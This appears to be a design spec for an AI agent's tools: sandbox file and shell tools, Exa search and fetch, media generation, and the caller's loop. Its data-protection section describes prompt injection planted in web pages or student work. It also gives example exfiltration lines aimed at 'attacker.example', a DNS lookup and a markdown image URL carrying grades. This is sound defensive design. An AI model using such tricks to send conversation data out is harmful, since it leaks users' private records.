# Tools

This page defines the agent's tools: what each takes and returns, how the caller runs them, and
the rules that keep a conversation's data in. Every tool is ours, a function tool the caller runs
beside llm_master (SPEC.md); no provider-hosted tools. Message parts are in IO.md, skills in
SKILLS.md, and the code in `agent/`.

| tool | runs on | precedent | result |
|---|---|---|---|
| read | sandbox | pi | text, or text and images |
| write | sandbox | pi | text |
| edit | sandbox | pi | text |
| bash | sandbox | pi | text |
| run_program | sandbox, calling host tools | Anthropic's programmatic tool calling | text |
| web_search | host (Exa) | exa-py's `web_search` | text and sources |
| fetch_url | host (Exa) | exa-py's `get_contents` | text and sources |
| generate_image | host (`image()`) | | text and the image; the image goes to the user |
| generate_audio | host (`speech()`) | | text; the audio goes to the user |
| deliver_file | host | | text; the file goes to the user |
| todo | host | Codex's `update_plan` | text |
| ask_user | the user | Claude Code's `AskUserQuestion` | text, once the user answers |

file_search, search_uflo_docs, mcp and widget come later; they aren't designed here.

Each tool copies a precedent the models already know, chosen once for every provider. A result is
text, or text and images. No API takes audio in a tool result, so audio goes to the user instead.

## Keeping data in

The model may follow instructions planted in a web page or a student's submission, and so may the
code it writes. Three rules keep the conversation's data in:

- **The sandbox has no keys and no network**, DNS included. A lookup of `<data>.attacker.example`
  carries data out, so Modal's domain allowlist isn't enough. Packages come baked into the image.
- **fetch_url reads only URLs the user wrote or Exa returned**, Anthropic's rule for its own web
  fetch. The model can't build a URL that carries data out. URLs in other tools' output don't
  count, since the model can print any URL with bash.
- **The browser never loads a URL the model wrote.** Images in answers load only from the files
  origin, where the caller hosts what the tools made. The app's content security policy enforces
  it (`img-src`, and `script-src` without `'unsafe-inline'`). HTML and SVG files are downloads
  only. Otherwise `![](https://attacker.example/?d=<grades>)` sends data out the moment it
  renders.

## Running tools

The caller installs `llm-master[agent]` and builds a `Toolbox` for each request of a
conversation. It lists the tools for the config and runs the model's calls:

```python
box = Toolbox("conv_8f2", tools=[lookup_grade], sources=saved_sources, urls=user_urls, llm=llm)
model = Model(provider="openai", model="gpt-5.5", config=Config(tools=box.specs))
response = await llm.query(model, history)
history.append(response.message)
for call in response.message.calls or []:
    result = await box.run(call.name, call.arguments)
    if result.waiting:
        continue  # the browser asks the user; the reply comes with the next request
    history.append({"role": "tool", "call_id": call.id, "content": result.content})
await box.aclose()
```

- **One request per conversation at a time.** The toolbox runs the tools that change the sandbox
  (write, edit, bash, run_program) one at a time, so two requests at once could race.
- **The conversation's id** names its sandbox.
- **`sources` and `urls`** carry state across rebuilds. `sources` are the source parts already
  sent, so numbering continues. `urls` are the URLs the user typed, which fetch_url may read.
- **`llm`** is llm_master's facade, for the generate pair.
- **`specs`** lists the built-in tools, then the caller's own, as openai function dicts.
- **Custom tools** are plain Python functions, sync or async. The schema comes from the signature
  and docstring, as in CONFIG.md field 6. One returns a string, a `Result`, or any JSON value, and
  raises `ToolError` to tell the model it failed.
- **`run` never raises.** It checks the arguments against the function's type hints first, so a
  wrong type is an error the model can fix. A `ToolError` reads as its message. Any other
  exception reads as the tool and the exception's type only, since its message may hold what the
  model mustn't see; the toolbox logs it.
- **A stopped turn**: the loop answers each unanswered call with `Stopped by the user.` A command
  already running runs on to its timeout.
- **`aclose()`** closes the toolbox's HTTP clients. The sandbox outlives it.

`run` returns a `Result`:

| field | meaning |
|---|---|
| `content` | the tool message's content: a string, or text and image parts (IO.md) |
| `files` | `UserFile(name, mime, data)` for the user. The caller hosts them on the files origin and sends AI SDK `file` parts |
| `sources` | AI SDK `source-url` parts. `sourceId` is the number the model cites |
| `error` | the tool failed; `content` says why |
| `waiting` | `"question"` when the call waits for the user |

A waiting call has no result yet. The loop ends the turn, and the browser asks the user (AI SDK's
client-side tools). The next request brings the reply, and `box.resume(name, arguments, reply)`
finishes the call before anything else joins the history. A request without a reply declines it
with None.

## The sandbox

Each conversation gets one Modal sandbox, named after it and started on its first sandbox call.

- **Files** live in `/workspace`, a Modal volume of the conversation's own. A sandbox that idled
  out comes back with every file.
- **Lifetime**: Modal stops a sandbox after 15 idle minutes, and after 24 hours at most.
  `agent.sandbox.delete(conversation_id)` stops it and drops the volume, for when the
  conversation goes.
- **Names**: the conversation id must fit a Modal name: letters, digits, `-`, `_` and `.`, at
  most 54 characters. A UUID fits. Each deployment uses its own Modal environment.
- **No network**, DNS included (Keeping data in).
- **The image** is Debian slim with Python 3.13, LibreOffice, poppler, Pillow and openpyxl.
  Nothing installs at run time, so a skill that needs a package adds it to the image. A new image
  reaches a conversation when its sandbox next starts.

## Shared rules

- **Paths** are relative to `/workspace`, the conversation's folder in its sandbox, or absolute.
  Only `/workspace` survives the sandbox stopping. Host tools' paths name sandbox files too.
- **Long text** is cut at 2000 lines or 50 KB, pi's limits, with a notice saying how to read on.
  bash and run_program keep the end. Every other tool keeps the start and saves the whole text in
  the sandbox for read. read pages through files itself. Calls inside a program aren't cut.
- **Citations** are numbers, one count across the conversation. The model writes `[3]` where it
  uses source 3.
- **Images** a tool returns are at most 1568 px on the long side, and JPEG unless transparent.
  That stays under the 2000 px Anthropic allows once a request holds more than 20 images.
- **Schemas** are written by hand in each precedent's words, and a test keeps each in step with
  its function.

## The tools

### read

`read(path, offset?, limit?)` is pi's read, extended to the files teachers work with. `offset` and
`limit` count lines, or pages for PDFs and documents, 10 at most.

| file | result |
|---|---|
| text, code | the text, without line numbers |
| image | the image. HEIC, BMP and TIFF convert |
| PDF | one image per page |
| docx, pptx, odt, rtf and the like | LibreOffice renders it to PDF, then as a PDF. This is how the model checks the files it builds |
| xlsx, xls, ods, csv, tsv | every sheet as CSV when the whole fits in 25 KB. Otherwise the first 20 rows of each sheet, and a pointer to bash. A formula cell without a saved value shows its formula |
| audio, video, binary files, folders | an error |

PDFs come back as page images, not a PDF part, because any-llm puts only images into a Gemini tool
result.

### write

`write(path, content)` is pi's write. It creates parent folders and overwrites.

### edit

`edit(path, edits)` is pi's edit, with `edits` a list of `{oldText, newText}`.

- Each `oldText` must match the original file exactly once, and edits must not overlap.
- The file keeps its line endings and BOM.
- Failures use pi's wording.
- Like pi, it accepts `edits` as a JSON string, or one edit without the list.
- pi's fuzzy match is left out until misses show up.

### bash

`bash(command, timeout?)` is pi's bash, with Claude Code's timeout: 120 seconds by default, 600 at
most. Each call runs a fresh `bash -c` in `/workspace`, with stdin closed. The output is stdout and
stderr interleaved, cut from the top; a cut names the full log. A timeout kills everything the
command started.

### run_program

`run_program(code, timeout?)` is Anthropic's programmatic tool calling, in our sandbox. The model
writes Python that calls tools, and only what the program prints comes back. The timeout is
bash's, inner calls included.

```python
pages = await asyncio.gather(*[web_search({"query": q, "objective": "..."}) for q in queries])
print(max(pages, key=len)[:2000])
```

- **Calls.** Each tool is an async function that takes one dict and returns the result's text. A
  failed call raises `ToolError`.
- **Which tools**: web_search, fetch_url, generate_image, generate_audio, deliver_file and every
  custom tool. The program has a shell already, and todo and ask_user draw UI.
- **At most 100 calls** per program.
- **The host checks every call**, since the program can send anything. Keys stay on the host.
- **Files and sources** from the calls inside reach the user.

### web_search

`web_search(query, objective, type?)` is exa-py's `web_search` tool, with Exa's `type` for depth.

- `objective` uses Exa's wording: "Goal for this search turn; say which documents should rank
  first, which should be excluded, and what specific facts or figures to pull from them."
- `type` is `auto` by default, or `deep`, Exa's slower multi-step search, which the research skill
  needs. Exa's other types trade quality for speed in ways the model can't judge.
- It returns 10 results with highlights, Exa's baseline, each numbered with its title, URL, date
  and author. Exa's notices pass on to the model; its warnings don't, as Exa asks.

### fetch_url

`fetch_url(urls)` is exa-py's `get_contents`. It reads only the URLs the second data rule allows;
anything else is an error that points at web_search. Links inside pages aren't followed. Each page
comes back whole, numbered like a search result, and a failed page doesn't fail the others.

### generate_image

`generate_image(prompt, image?)` makes an image with `image()`, or edits the image at `image`. An
edit sends the parent and the prompt together (SPEC.md, Media). The image is saved under `images/`
with a record beside it naming its parent, prompt and candidate. Openai goes first, gemini is the
fallback.

### generate_audio

`generate_audio(text)` is one-shot speech with `speech()`, at most 4096 characters, OpenAI's limit.
The audio is saved under `audio/` and goes to the user. Openai goes first, gemini is the fallback.

### deliver_file

`deliver_file(path)` sends a sandbox file to the user, one file per call.

### todo

`todo(plan, explanation?)` is Codex's update_plan, with `plan` a list of `{step, status}`. It is
the simpler precedent: Claude Code's TodoWrite needs a third field per step. The tool keeps no
state, and the UI draws the latest call's plan.

### ask_user

`ask_user(questions)` is Claude Code's AskUserQuestion: 1–4 questions of 2–4 options each, without
its terminal-only `preview`. The call waits for the user (Running tools). The model then reads
Claude Code's answer text, or `User declined to answer questions`.

## Files

`box.attach(name, data)` saves an upload under `uploads/`. It returns the user message's parts:
the path, and what the model gets within read's limits.

| upload | the model gets |
|---|---|
| image | the image |
| PDF up to 10 pages and 5 MB | the PDF |
| audio up to 10 minutes and 20 MB | the audio |
| spreadsheet up to 25 KB | every sheet as CSV |
| larger spreadsheet | a preview |
| anything else | the path; read opens it |
| video | not supported |

Longer audio gets the path only, and nothing can listen to it yet.

## Known limits

- Images stay in the history and go out again on every step. A long session of renders can hit
  Anthropic's 32 MB request cap, or its 100 images on 200k-context models. Dropping old images
  would miss the prompt cache, so nothing drops them; read's paging keeps each render small.
- Fireworks' text-only models reject an image in a tool result, so the first image a tool returns
  takes them out of the fallback chain.
- An audio upload leaves only Gemini and OpenAI's audio models able to answer (IO.md).
- A planted instruction can still put data into a search query, which reaches Exa, not the
  attacker. Routes that need the user remain: a link the user clicks, and a downloaded HTML file
  the user opens.
